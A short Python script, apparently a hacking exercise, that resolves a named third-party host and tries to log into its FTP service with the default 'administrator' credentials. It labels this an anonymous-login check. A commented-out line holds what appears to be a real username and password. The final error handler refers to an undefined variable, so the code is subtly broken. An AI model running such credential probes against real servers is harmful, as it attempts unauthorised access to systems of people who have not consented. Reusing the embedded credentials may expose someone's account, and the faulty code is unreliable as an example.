import ftplib
import socket

def anonLogin(hostName):
    try:
        ftp = ftplib.FTP(hostName)
        ftp.login('administrator', 'administrator')
        # ftp.login('yif', 'msn290850640')
        print('[+]' + str(hostName) + ' FTP Anonymouse Login Succeeded!')
        ftp.quit()
        return True
    except Exception as e:
        print('[-]' + str(hostName) + ' FTP Anonymouse Login Failed!')
        return False

host = 'm.xxxiao.com'
try:
    tgtIP = socket.gethostbyname(host)
    anonLogin(tgtIP)
except Exception as e:
    print("[-] Cannot resolve '%s': Unknown host" % tgtHost)


